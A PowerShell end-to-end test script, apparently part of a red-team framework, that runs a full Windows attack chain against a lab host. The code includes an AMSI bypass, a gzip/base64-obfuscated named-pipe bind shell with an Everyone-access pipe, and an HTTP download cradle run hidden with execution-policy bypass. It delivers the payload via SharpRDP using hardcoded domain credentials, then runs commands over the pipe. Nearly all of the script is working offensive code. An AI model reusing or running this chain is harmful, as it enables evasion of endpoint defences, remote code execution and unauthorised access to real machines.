# TestBindShellDirect.ps1
# End-to-end bind shell test: generate payload, serve via HTTP, deliver via SharpRDP,
# connect via named pipe (with explicit credentials via net use / cmdkey), verify session.
#
# Usage: .\Tests\TestBindShellDirect.ps1 [-Target <IP>] [-OperatorIP <IP>]
# Prerequisites: Tools\Invoke-SharpRDP.ps1 must exist.
# Note: run from Amnesiac-main directory, or from a runas /netonly session for native auth.

param(
    [string]$Target     = "10.3.10.11",
    [string]$Username   = "NORTH\hodor",
    [string]$Password   = "hodor",
    [string]$OperatorIP = "10.3.10.157",
    [int]   $Port       = 8080,
    [int]   $WaitSecs   = 40
)

$root = Split-Path -Parent $PSScriptRoot

# -- Step 1: Generate bind shell payload -------------------------------------
$endMarker = "BSTEST_" + -join ((65..90) | Get-Random -Count 6 | % { [char]$_ })
$pipeName  = "BST_" + -join ((65..90) + (97..122) | Get-Random -Count 12 | % { [char]$_ })
$bufSize   = 65536

Write-Host "[*] PipeName  : $pipeName"  -ForegroundColor Cyan
Write-Host "[*] EndMarker : $endMarker" -ForegroundColor Cyan

$rawServer = @"
[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true);
[void][Reflection.Assembly]::LoadWithPartialName('System.Core');
`$sec=New-Object System.IO.Pipes.PipeSecurity;
`$sid=New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0';
`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$sid,'FullControl','Allow');
`$sec.AddAccessRule(`$ar);
`$sT='System.IO.Pipes.NamedPipeSer'+'verStream';
while(`$true){
    `$ps=New-Object -TypeName `$sT -ArgumentList '$pipeName','InOut',-1,'Byte','None',$bufSize,$bufSize,`$sec;
    `$rd=New-Object IO.StreamReader(`$ps);
    `$wr=New-Object IO.StreamWriter(`$ps);
    `$ps.WaitForConnection();
    try{`$tm=`$rd.ReadLineAsync();if(`$tm.Wait(2000)-and`$null-ne`$tm.Result){`$cmd=`$tm.Result;break}}catch{};
    `$ps.Dispose()
}
`$cb=`$true;
while(`$true){
    if(-not `$ps.IsConnected){break}
    if(`$cb){`$cb=`$false}else{`$cmd=`$rd.ReadLine()}
    if(`$cmd-eq'exit'-or`$null-eq`$cmd){break}
    try{`$r=& ([scriptblock]::Create(`$cmd)) 2>&1|Out-String;`$r-split([char]10)|%{`$wr.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split([char]10)|%{`$wr.WriteLine(`$_)}};
    `$wr.WriteLine('$endMarker');`$wr.Flush()
}
`$ps.Dispose()
"@

$bytes = [Text.Encoding]::UTF8.GetBytes($rawServer)
$ms    = [IO.MemoryStream]::new()
$gzs   = [IO.Compression.GzipStream]::new($ms,[IO.Compression.CompressionMode]::Compress)
$gzs.Write($bytes,0,$bytes.Length); $gzs.Close()
$b64   = [Convert]::ToBase64String($ms.ToArray())
$inlinePS = "`$gz='$b64';`$a=New-Object IO.MemoryStream(,[Convert]::FromBase64String(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CompressionMode]::Decompress);`$c=New-Object IO.MemoryStream;`$b.CopyTo(`$c);`$d=[Text.Encoding]::UTF8.GetString(`$c.ToArray());`$b.Close();`$a.Close();`$c.Close();[scriptblock]::Create(`$d).Invoke()"

$payloadFile = "bindshell_test.ps1"
$payloadPath = Join-Path $root $payloadFile
[System.IO.File]::WriteAllText($payloadPath, $inlinePS, (New-Object Text.UTF8Encoding $false))
Write-Host "[+] Payload written: $payloadPath ($($inlinePS.Length) chars)" -ForegroundColor Green

# -- Step 2: Verify serve is available and can serve the file ----------------
Write-Host "[*] Checking HTTP server at http://${OperatorIP}:${Port}/$payloadFile" -ForegroundColor Cyan
$httpOK = $false
try {
    $wc = New-Object Net.WebClient
    $fetched = $wc.DownloadString("http://127.0.0.1:${Port}/$payloadFile")
    Write-Host "[+] Existing serve can deliver payload ($($fetched.Length) chars)" -ForegroundColor Green
    $httpOK = $true
} catch {
    Write-Host "[!] Serve unavailable locally -- starting temporary HTTP server..." -ForegroundColor Yellow
}

$httpJob = $null
if (-not $httpOK) {
    $httpJob = Start-Job -ScriptBlock {
        param($root, $port)
        $tries = 0
        while ($tries -lt 5) {
            try {
                $l = [System.Net.HttpListener]::new()
                $l.Prefixes.Add("http://+:$port/")
                $l.Start()
                Write-Output "[+] HTTP listening on $port"
                $deadline = (Get-Date).AddSeconds(120)
                while ((Get-Date) -lt $deadline) {
                    try {
                        $ctx = $l.GetContext()
                        $req = $ctx.Request; $rsp = $ctx.Response
                        $urlPath = $req.Url.LocalPath.TrimStart('/')
                        $filePath = Join-Path $root $urlPath
                        Write-Output "[*] GET /$urlPath"
                        if (Test-Path $filePath -PathType Leaf) {
                            $data = [System.IO.File]::ReadAllBytes($filePath)
                            $rsp.ContentType = "text/plain"
                            $rsp.ContentLength64 = $data.Length
                            $rsp.OutputStream.Write($data,0,$data.Length)
                            Write-Output "[+] Served /$urlPath ($($data.Length) bytes)"
                        } else {
                            $rsp.StatusCode = 404
                            Write-Output "[-] 404: $urlPath"
                        }
                        $rsp.OutputStream.Close()
                    } catch {
                        if ($_.Exception.Message -notmatch 'stopped|disposed') { Write-Output "[-] $_" }
                        break
                    }
                }
                try { $l.Stop() } catch {}
                return
            } catch {
                $tries++; Start-Sleep 1
            }
        }
        Write-Output "[-] All ports tried, giving up"
    } -ArgumentList $root, $Port
    Start-Sleep 2
    $httpLog = Receive-Job $httpJob
    $httpLog | ForEach-Object { Write-Host "    [HTTP] $_" -ForegroundColor DarkGray }
}

# -- Step 3: Load SharpRDP ----------------------------------------------------
Write-Host "[*] Loading SharpRDP..." -ForegroundColor Cyan
$srdpPath = Join-Path $root "Tools\Invoke-SharpRDP.ps1"
if (-not ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'SharpRDP' })) {
    $src = [System.IO.File]::ReadAllText($srdpPath)
    $m   = [regex]::Match($src, '"(H4sI[A-Za-z0-9+/=]{100,})"')
    if ($m.Success) {
        $ms1 = New-Object IO.MemoryStream(,[Convert]::FromBase64String($m.Groups[1].Value))
        $gz  = New-Object IO.Compression.GzipStream($ms1,[IO.Compression.CompressionMode]::Decompress)
        $ms2 = New-Object IO.MemoryStream; $gz.CopyTo($ms2); $gz.Close(); $ms1.Close()
        [System.Reflection.Assembly]::Load($ms2.ToArray()) | Out-Null
        Write-Host "[+] SharpRDP loaded." -ForegroundColor Green
    } else { Write-Host "[-] SharpRDP blob not found." -ForegroundColor Red; exit 1 }
} else {
    Write-Host "[*] SharpRDP already loaded." -ForegroundColor Cyan
}

# -- Step 4: Establish SMB session for named pipe auth -----------------------
# net use \\target\IPC$ caches credentials so NamedPipeClientStream can authenticate
Write-Host "[*] Establishing SMB session to $Target for pipe auth..." -ForegroundColor Cyan
$domain = $Username.Split('\')[0]
$user   = $Username.Split('\')[-1]
$nuResult = & net use "\\$Target\IPC`$" "/user:$domain\$user" $Password 2>&1
Write-Host "    net use result: $nuResult" -ForegroundColor DarkGray

# -- Step 5: Deliver via SharpRDP download cradle -----------------------------
$amsiBypass = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"
$cradle     = "iex(new-object net.webclient).downloadstring('http://${OperatorIP}:${Port}/$payloadFile')"
$srdpCmd    = "powershell -nop -ep bypass -w hidden -c `"$amsiBypass;$cradle`""

Write-Host ""
Write-Host "[*] Delivering via SharpRDP..." -ForegroundColor Cyan
Write-Host "    command (after tolower): $($srdpCmd.ToLower())" -ForegroundColor DarkGray

[SharpRDP.Program]::Main(@(
    "computername=$Target",
    "username=$Username",
    "password=$Password",
    "command=$srdpCmd",
    "exec=cmd"
))

# -- Step 6: Poll for named pipe connection ------------------------------------
Write-Host ""
Write-Host "[*] Polling \\$Target\pipe\$pipeName (${WaitSecs}s timeout)..." -ForegroundColor Cyan

$deadline   = (Get-Date).AddSeconds($WaitSecs)
$pipeClient = $null
$connected  = $false

while ((Get-Date) -lt $deadline) {
    if ($httpJob) {
        Receive-Job $httpJob | ForEach-Object { Write-Host "    [HTTP] $_" -ForegroundColor DarkGray }
    }
    try {
        $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream($Target, $pipeName, 'InOut')
        $pipeClient.Connect(500)
        if ($pipeClient.IsConnected) { $connected = $true; break }
    } catch {
        if ($pipeClient) { $pipeClient.Dispose(); $pipeClient = $null }
        $remaining = [int]($deadline - (Get-Date)).TotalSeconds
        Write-Host "    [.] $remaining`s left -- $($_.Exception.Message.Split('.')[0])" -ForegroundColor DarkGray
        Start-Sleep 2
    }
}

# -- Step 7: Verify session ----------------------------------------------------
if ($connected) {
    Write-Host ""
    Write-Host "[+] CONNECTED to $Target via named pipe!" -ForegroundColor Green

    $sr = New-Object IO.StreamReader($pipeClient)
    $sw = New-Object IO.StreamWriter($pipeClient)

    function Send-Cmd([string]$c) {
        $sw.WriteLine($c); $sw.Flush()
        $out = [Text.StringBuilder]::new()
        while ($true) {
            $line = $sr.ReadLine()
            if ($null -eq $line -or $line -eq $endMarker) { break }
            $out.AppendLine($line) | Out-Null
        }
        return $out.ToString().TrimEnd()
    }

    Write-Host "[*] whoami" -ForegroundColor Cyan
    Write-Host "[+] $( Send-Cmd 'whoami' )" -ForegroundColor Green

    Write-Host "[*] hostname" -ForegroundColor Cyan
    Write-Host "[+] $( Send-Cmd 'hostname' )" -ForegroundColor Green

    Write-Host "[*] ipconfig" -ForegroundColor Cyan
    Write-Host (Send-Cmd "ipconfig | Select-String '10\.'") -ForegroundColor Green

    $sw.WriteLine("exit"); $sw.Flush()
    $pipeClient.Dispose()
    Write-Host ""
    Write-Host "[+] TEST PASSED: Bind shell session established and verified." -ForegroundColor Green
} else {
    Write-Host ""
    Write-Host "[-] TEST FAILED: No connection within ${WaitSecs}s." -ForegroundColor Red
    Write-Host "    Possible causes:" -ForegroundColor Yellow
    Write-Host "      1. HTTP not serving (check 'serve' in Amnesiac or start manually)" -ForegroundColor Yellow
    Write-Host "      2. AMSI/Defender blocked payload on target" -ForegroundColor Yellow
    Write-Host "      3. SharpRDP did not execute (check output above)" -ForegroundColor Yellow
    Write-Host "      4. Named pipe SMB auth failed (try from runas /netonly Amnesiac session)" -ForegroundColor Yellow
    Write-Host "      5. Port 445 blocked target->operator or operator->target" -ForegroundColor Yellow
}

# -- Cleanup ----------------------------------------------------------------
Remove-Item $payloadPath -ErrorAction SilentlyContinue
& net use "\\$Target\IPC`$" /delete 2>&1 | Out-Null
if ($httpJob) { Stop-Job $httpJob -ErrorAction SilentlyContinue; Remove-Job $httpJob -ErrorAction SilentlyContinue }
Write-Host "[*] Cleanup done." -ForegroundColor DarkGray
